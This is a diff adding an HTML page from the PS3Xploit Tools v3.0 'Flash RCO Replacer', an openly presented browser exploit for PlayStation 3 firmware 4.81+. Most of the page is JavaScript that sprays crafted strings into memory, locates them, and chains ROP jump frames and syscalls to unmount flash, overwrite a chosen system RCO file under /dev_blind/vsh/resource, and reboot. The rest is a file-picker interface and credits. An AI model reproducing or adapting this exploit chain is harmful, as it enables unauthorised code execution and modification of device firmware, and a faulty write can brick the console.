@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="ps3xploit_v30.js"></script>
+<meta charset="UTF-8"> 
+<title>PS3Xploit Tools v3.0 - Flash RCO Replacer</title>
+<script>
+function initROP(init)
+{
+	try
+	{
+		if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0;}
+		if(t_out!==0){clearTimeout(t_out);t_out=0;}
+		offset_array=[];
+		disable_all();
+		clearLogEntry();
+		store_idx_arr1=new Array(1);
+		store_idx_arr2=new Array(1);
+		xtra_data_addr=0;
+		stack_frame_addr=0;
+		jump_2_addr=0;
+		jump_1_addr=0;
+
+		var search_max_threshold=70*0x100000; // 70Mb maximum memory search
+		var search_base=0x80200000;//0x80190000;//
+		var search_size=2*mbytes;
+		search_base_off=0*mbytes;
+		search_size_ext=2*mbytes;
+		total_loops++;
+		
+		// Overwrite filename and destination path here
+		template_1_file_usb='/'+getdestFile();
+		template_1_file_blind='/dev_blind/vsh/resource'+template_1_file_usb;
+		
+		xtra_data=flash_partition.convert()
+		+filesystem.convert()
+		+mount_path.convert()
+		+getPath(template_1_file_usb).convert()
+		+fill_by_4bytes(0xC,dbyte00)
+		+template_1_file_blind.convert()
+		+make_dummy_xtra2()
+		+fill_by_16bytes(0x70,dbyte00)
+		+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)+syscall(sc_sm_shutdown,hard_reboot,0,0,0,0,0,0,0)
+		+unescape("\uFD7E");
+		while(xtra_data_addr===0)
+		{
+			if(search_max_threshold<search_size){load_check();return;}
+			xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));
+			xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);
+			search_max_threshold-=search_size;
+		}
+		
+		flash_partition_addr=xtra_data_addr;
+		fs_addr=flash_partition_addr+flash_partition.convertedSize()-0x4;
+		mount_path_addr=fs_addr+filesystem.convertedSize();
+		
+		template_1_file_usb_addr=mount_path_addr+mount_path.convertedSize();
+		template_1_file_usbfd_addr=template_1_file_usb_addr+getPath(template_1_file_usb).convertedSize();
+		template_1_file_usb_readlen_addr=template_1_file_usbfd_addr+word_size;
+		
+		template_1_file_blind_addr=template_1_file_usb_readlen_addr+dword_size;
+		template_1_file_blindfd_addr=template_1_file_blind_addr+template_1_file_blind.convertedSize();
+		template_1_file_blind_writelen_addr=template_1_file_blindfd_addr+word_size;
+		store_idx_arr1[0]=(template_1_file_blind_writelen_addr-flash_partition_addr+0x8)/2;
+		
+		null_addr=template_1_file_blind_writelen_addr+dword_size+make_dummy_null_padding2()+dword_size;
+		
+		store_idx_arr2[0]=(null_addr-flash_partition_addr+0xC)/2;
+		stat_addr=null_addr+dword_size*0x3;
+		reboot_sf_addr=stat_addr+dword_size*0xB;
+		//############################ Building stack frame ###############################################################
+		stack_frame=stack_frame_hookup()
+		+syscall(sc_fs_umount,flash_partition_addr,fs_addr,mount_path_addr,0,0,0,0,0)
+		+copy_file_overwrite(template_1_file_usb_addr,template_1_file_blind_addr,template_1_file_usbfd_addr,template_1_file_blindfd_addr,template_1_file_buf_addr,template_1_file_usb_readlen_addr,template_1_file_blind_writelen_addr,stat_addr,null_addr,null_addr+0x8)
+		+optional_reboot1(reboot_sf_addr,template_1_file_blind_writelen_addr)
+		+stack_frame_exit();
+		//############################ End stack frame ###############################################################		
+		
+		while(stack_frame_addr===0)
+		{
+			if(search_max_threshold<search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0;}load_check();return;}
+			stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));
+			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);
+			if(stack_frame_addr==-1)if(search_max_threshold<search_size+search_size_ext){frame_fails++;load_check();return;}
+			search_max_threshold-=search_size+search_size_ext;
+		}
+		jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,dbyte41)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");		
+		while(jump_2_addr===0)
+		{
+			if(search_max_threshold<search_size){load_check();return;}
+			jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));
+			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);
+			if(jump_2_addr==-1)if(search_max_threshold<search_size){load_check();return;}
+			search_max_threshold-=search_size;
+		}
+		jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");
+		while(jump_1_addr===0)
+		{
+			if(search_max_threshold<search_size){load_check();return;}
+			jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));
+			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);
+			if(jump_1_addr==-1)if(search_max_threshold<search_size){load_check();return;}
+			search_max_threshold-=search_size;
+		}
+		var sf=checkMemory(stack_frame_addr-0x4,0x10000,stack_frame.length);
+		var x=checkMemory(xtra_data_addr-0x4,0x2000,xtra_data.length);
+		var j2=checkMemory(jump_2_addr-0x4,0x800,jump_2.length);
+		var j1=checkMemory(jump_1_addr-0x4,0x800,jump_1.length);
+		if((j2===jump_2)&&(j1===jump_1)&&(x===xtra_data)&&(sf===stack_frame))
+		{
+			if(t_out!==0){clearTimeout(t_out);}
+			showResult(hr+"<h1><b><font color=%22386E38%22>Flash RCO Replacer initialized successfully.</font></b></h1><h3><b><span style='color:#000000;'>You can now launch Flash RCO Replacer.</span></b></h3>");
+			enable_trigger();
+		}
+		else
+		{
+			if(x!==xtra_data)logAdd("xtra_data mismatch in memory!");
+			if(sf!==stack_frame)logAdd("stack_frame mismatch in memory!");
+			if(j2!==jump_2)logAdd("jump_2 mismatch in memory!");
+			if(j1!==jump_1)logAdd("jump_1 mismatch in memory!");
+			//logAdd("String mismatch in memory!");
+			load_check();
+		}
+	}
+	catch(e)
+	{
+		debug=true;
+		logAdd(br+"Flash RCO Replacer initialization failed because the following exception was thrown during execution:"+br+e+" at : "+e.lineNumber);
+		debug=false;
+	}
+}
+
+function triggerX()
+{
+		clearLogEntry();
+		showResult(hr+"<h2><b><span style='color:#000000;'>Copying RCO File To Flash...</span></b></h2>");
+		disable_all();
+		setTimeout(trigger,1000,jump_1_addr);
+		setTimeout(rop_exit_1val,2000,hr+"<h1><b><font color=%22386E38%22>Flash RCO Replacer succeeded!</font></span></b></h1>",hr+"<h1><b><font color='red'>Flash RCO Replacer failed!</font></b></h1><h3><b><span style='color:#000000;'>Error copying file(s):</span></b></h3>","<h3><b><span style='color:#000000;'>"+getdestFile()+" to "+template_1_file_blind+"</span></b></h3>");
+		cleanGUI();
+}
+</script>
+</head>
+	<body id="bodyId" style="background-color:#FFD097">
+	<div id="headerId" style="color:#CC2010">
+	<h1>PS3Xploit Tools v3.0 - Flash RCO Replacer</h1>
+	<h2><span style="color:#000000">Courtesy of PS3Xploit Team</span></h2><b>esc0rtd3w </b><span style="color:#000000;"> (Debugging & Testing) <b>|</b> </span><b>habib </b><span style="color:#000000"> (Reverse Engineering & Debugging) <b>|</b> </span><b>bguerville </b><span style="color:#000000"> (ROP, Javascript & Debugging)</span><hr>
+		<span style="color:#000000">Many thanks to xerpi for porting the memory leak exploit to ps3, zecoxao & Joonie for their early & renewed support, mysis for documenting vsh/lv2, SSL for his regular & precious advice, kakaroto for the PS3 IDA tools, naherwert for scetool, Rebug Team for producing/updating the only CFW adequate to develop this work & Cobra team for sharing their CobraUSB source, the psdevwiki team of course, STLcardsWS for his long standing contribution & ever constant support.<br>We also wish to thank all the ps3 community hackers/devs, past & present, who directly or indirectly helped us put this project together, you know who you are...</span><hr>
+	<h3>Supports OFW and CFW CEX/DEX 4.81+ Firmware</h3>
+	<p><span style="color:#000000">More details & news on</span> <a href="http://www.psx-place.com/forums/ps3xploit">http://www.psx-place.com</a></p>
+	<hr></div>
+	
+	<b>Select Source RCO File:</b><br>
+	<select name="dpath" id="combodestFile" onchange="getdestFile();" >
+	<option value="ap_plugin.rco">ap_plugin.rco</option>
+	<option value="audioplayer_plugin.rco">audioplayer_plugin.rco</option>
+	<option value="audioplayer_plugin_dummy.rco">audioplayer_plugin_dummy.rco</option>
+	<option value="audioplayer_plugin_mini.rco">audioplayer_plugin_mini.rco</option>
+	<option value="audioplayer_plugin_util.rco">audioplayer_plugin_util.rco</option>
+	<option value="auth_plugin.rco">auth_plugin.rco</option>
+	<option value="autodownload_plugin.rco">autodownload_plugin.rco</option>
+	<option value="autoupdateconf_plugin.rco">autoupdateconf_plugin.rco</option>
+	<option value="avc2_game_plugin.rco">avc2_game_plugin.rco</option>
+	<option value="avc2_game_video_plugin.rco">avc2_game_video_plugin.rco</option>
+	<option value="avc2_text_plugin.rco">avc2_text_plugin.rco</option>
+	<option value="avc_game_plugin.rco">avc_game_plugin.rco</option>
+	<option value="avc_plugin.rco">avc_plugin.rco</option>
+	<option value="bdp_disccheck_plugin.rco">bdp_disccheck_plugin.rco</option>
+	<option value="bdp_plugin.rco">bdp_plugin.rco</option>
+	<option value="bdp_storage_plugin.rco">bdp_storage_plugin.rco</option>
+	<option value="campaign_plugin.rco">campaign_plugin.rco</option>
+	<option value="category_setting_plugin.rco">category_setting_plugin.rco</option>
+	<option value="checker_plugin.rco">checker_plugin.rco</option>
+	<option value="closedcaption_config_plugin.rco">closedcaption_config_plugin.rco</option>
+	<option value="comboplay_plugin.rco">comboplay_plugin.rco</option>
+	<option value="custom_render_plugin.rco">custom_render_plugin.rco</option>
+	<option value="data_copy_plugin.rco">data_copy_plugin.rco</option>
+	<option value="deviceconf_plugin.rco">deviceconf_plugin.rco</option>
+	<option value="dlna_plugin.rco">dlna_plugin.rco</option>
+	<option value="download_plugin.rco">download_plugin.rco</option>
+	<option value="dtcpip_util.rco">dtcpip_util.rco</option>
+	<option value="edy_plugin.rco">edy_plugin.rco</option>
+	<option value="eula_cddb_plugin.rco">eula_cddb_plugin.rco</option>
+	<option value="eula_hcopy_plugin.rco">eula_hcopy_plugin.rco</option>
+	<option value="eula_net_plugin.rco">eula_net_plugin.rco</option>
+	<option value="explore_category_friend.rco">explore_category_friend.rco</option>
+	<option value="explore_category_game.rco">explore_category_game.rco</option>
+	<option value="explore_category_music.rco">explore_category_music.rco</option>
+	<option value="explore_category_network.rco">explore_category_network.rco</option>
+	<option value="explore_category_photo.rco">explore_category_photo.rco</option>
+	<option value="explore_category_psn.rco">explore_category_psn.rco</option>
+	<option value="explore_category_sysconf.rco">explore_category_sysconf.rco</option>
+	<option value="explore_category_tv.rco">explore_category_tv.rco</option>
+	<option value="explore_category_user.rco">explore_category_user.rco</option>
+	<option value="explore_category_video.rco">explore_category_video.rco</option>
+	<option value="explore_plugin_ft.rco">explore_plugin_ft.rco</option>
+	<option value="explore_plugin_full.rco">explore_plugin_full.rco</option>
+	<option value="explore_plugin_game.rco">explore_plugin_game.rco</option>
+	<option value="explore_plugin_np.rco">explore_plugin_np.rco</option>
+	<option value="filecopy_plugin.rco">filecopy_plugin.rco</option>
+	<option value="friendim_plugin.rco">friendim_plugin.rco</option>
+	<option value="friendim_plugin_game.rco">friendim_plugin_game.rco</option>
+	<option value="friendml_plugin.rco">friendml_plugin.rco</option>
+	<option value="friendml_plugin_game.rco">friendml_plugin_game.rco</option>
+	<option value="friendtrophy_plugin.rco">friendtrophy_plugin.rco</option>
+	<option value="friendtrophy_plugin_game.rco">friendtrophy_plugin_game.rco</option>
+	<option value="gamedata_plugin.rco">gamedata_plugin.rco</option>
+	<option value="gamelib_plugin.rco">gamelib_plugin.rco</option>
+	<option value="gameupdate_plugin.rco">gameupdate_plugin.rco</option>
+	<option value="game_ext_plugin.rco">game_ext_plugin.rco</option>
+	<option value="game_indicator_plugin.rco">game_indicator_plugin.rco</option>
+	<option value="game_plugin.rco">game_plugin.rco</option>
+	<option value="hknw_plugin.rco">hknw_plugin.rco</option>
+	<option value="idle_plugin.rco">idle_plugin.rco</option>
+	<option value="impose_plugin.rco">impose_plugin.rco</option>
+	<option value="ingame_manual_plugin.rco">ingame_manual_plugin.rco</option>
+	<option value="kensaku_plugin.rco">kensaku_plugin.rco</option>
+	<option value="mouse_plugin.rco">mouse_plugin.rco</option>
+	<option value="msgdialog_plugin.rco">msgdialog_plugin.rco</option>
+	<option value="mtpinitiator_plugin.rco">mtpinitiator_plugin.rco</option>
+	<option value="musicbrowser_plugin.rco">musicbrowser_plugin.rco</option>
+	<option value="nas_plugin.rco">nas_plugin.rco</option>
+	<option value="netconf_plugin.rco">netconf_plugin.rco</option>
+	<option value="newstore_effect.rco">newstore_effect.rco</option>
+	<option value="newstore_plugin.rco">newstore_plugin.rco</option>
+	<option value="npsignin_plugin.rco">npsignin_plugin.rco</option>
+	<option value="np_eula_plugin.rco">np_eula_plugin.rco</option>
+	<option value="np_matching_plugin.rco">np_matching_plugin.rco</option>
+	<option value="np_multisignin_plugin.rco">np_multisignin_plugin.rco</option>
+	<option value="np_sns_plugin.rco">np_sns_plugin.rco</option>
+	<option value="np_trophy_ingame.rco">np_trophy_ingame.rco</option>
+	<option value="np_trophy_plugin.rco">np_trophy_plugin.rco</option>
+	<option value="oskfullkeypanel_plugin.rco">oskfullkeypanel_plugin.rco</option>
+	<option value="oskpanel_plugin.rco">oskpanel_plugin.rco</option>
+	<option value="osk_plugin.rco">osk_plugin.rco</option>
+	<option value="pesm_plugin.rco">pesm_plugin.rco</option>
+	<option value="photolist_plugin.rco">photolist_plugin.rco</option>
+	<option value="photoupload_plugin.rco">photoupload_plugin.rco</option>
+	<option value="photoviewer_plugin.rco">photoviewer_plugin.rco</option>
+	<option value="photo_network_sharing_plugin.rco">photo_network_sharing_plugin.rco</option>
+	<option value="playlist_plugin.rco">playlist_plugin.rco</option>
+	<option value="podl_plugin.rco">podl_plugin.rco</option>
+	<option value="poweroff_plugin.rco">poweroff_plugin.rco</option>
+	<option value="premo_plugin.rco">premo_plugin.rco</option>
+	<option value="print_plugin.rco">print_plugin.rco</option>
+	<option value="profile_plugin.rco">profile_plugin.rco</option>
+	<option value="profile_plugin_mini.rco">profile_plugin_mini.rco</option>
+	<option value="ps3_savedata_plugin.rco">ps3_savedata_plugin.rco</option>
+	<option value="ps3_savedata_plugin_game_mini.rco">ps3_savedata_plugin_game_mini.rco</option>
+	<option value="rec_plugin.rco">rec_plugin.rco</option>
+	<option value="regcam_plugin.rco">regcam_plugin.rco</option>
+	<option value="remotedownload_plugin.rco">remotedownload_plugin.rco</option>
+	<option value="sacd_plugin.rco">sacd_plugin.rco</option>
+	<option value="scenefolder_plugin.rco">scenefolder_plugin.rco</option>
+	<option value="screenshot_plugin.rco">screenshot_plugin.rco</option>
+	<option value="search_service.rco">search_service.rco</option>
+	<option value="software_update_plugin.rco">software_update_plugin.rco</option>
+	<option value="soundvisualizer_plugin.rco">soundvisualizer_plugin.rco</option>
+	<option value="strviewer_plugin.rco">strviewer_plugin.rco</option>
+	<option value="subdisplay_plugin.rco">subdisplay_plugin.rco</option>
+	<option value="sv_pseudoaudioplayer_plugin.rco">sv_pseudoaudioplayer_plugin.rco</option>
+	<option value="sysconf_plugin.rco">sysconf_plugin.rco</option>
+	<option value="system_plugin.rco">system_plugin.rco</option>
+	<option value="thumthum_plugin.rco">thumthum_plugin.rco</option>
+	<option value="upload_util.rco">upload_util.rco</option>
+	<option value="user_info_plugin.rco">user_info_plugin.rco</option>
+	<option value="user_plugin.rco">user_plugin.rco</option>
+	<option value="videoeditor_plugin.rco">videoeditor_plugin.rco</option>
+	<option value="videoplayer_plugin.rco">videoplayer_plugin.rco</option>
+	<option value="videoplayer_util.rco">videoplayer_util.rco</option>
+	<option value="vmc_savedata_plugin.rco">vmc_savedata_plugin.rco</option>
+	<option value="wboard_plugin.rco">wboard_plugin.rco</option>
+	<option value="webbrowser_plugin.rco">webbrowser_plugin.rco</option>
+	<option value="webrender_plugin.rco">webrender_plugin.rco</option>
+	<option value="xai_plugin.rco">xai_plugin.rco</option>
+	<option value="xmb_ingame.rco">xmb_ingame.rco</option>
+	<option value="xmb_plugin_normal.rco">xmb_plugin_normal.rco</option>
+	<option value="ycon_manual_plugin.rco">ycon_manual_plugin.rco</option>
+	</select>
+	
+	<p><span style="color:#000000"><b>Root Path</b> </span>
+	<select id="combofilePath" name="fPath" size="1" onChange="selectfilePath()">
+	<option id="usb_0" selected="selected" value="/dev_usb000">/dev_usb000</option><option id="usb_1" value="/dev_usb001">/dev_usb001</option><option id="usb_6" value="/dev_usb006">/dev_usb006</option><option id="xploit_extras" value="/dev_hdd0/game/PS3XPLOIT/USRDIR/extras">/dev_hdd0/game/PS3XPLOIT/USRDIR/extras</option><option id="han_toolbox" value="/dev_hdd0/game/HANTOOLBX/USRDIR/files/">/dev_hdd0/game/HANTOOLBX/USRDIR/files/</option>
+	</select> | Auto-Close Browser <input type="checkbox" id="auto_close" name="aclose" onclick="autoclose();"/> | Auto-Reboot <input type="checkbox" id="auto_reboot" name="areboot" checked="checked" onclick="autoreboot();"/>
+	<span id="dex_txt" style="visibility:hidden"> | DEX mode<input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/></span></p>
+	<p><button id="btnROP" type="button" onclick="initROP(true);" autofocus>Initialize Flash RCO Replacer</button> | 
+	<button id="btnTrigger" disabled="" type="button" onclick="triggerX();">Copy RCO File To Flash</button><span id="reset" style="visibility:hidden"> | <button id="btnReset" type="button" onclick="disable_trigger();">Reset</button></span></p>
+	<div id="result" style="color:#CC2010"></div><br>
+	<div id="log"></div>
+	<div id="exploit" ></div>
+	<div id="trigger"></div>
+	<div id="footer"></div>
+	<script>
+		writeEnvInfo();
+		ps3chk();
+	</script>
+	</body>
+</html>
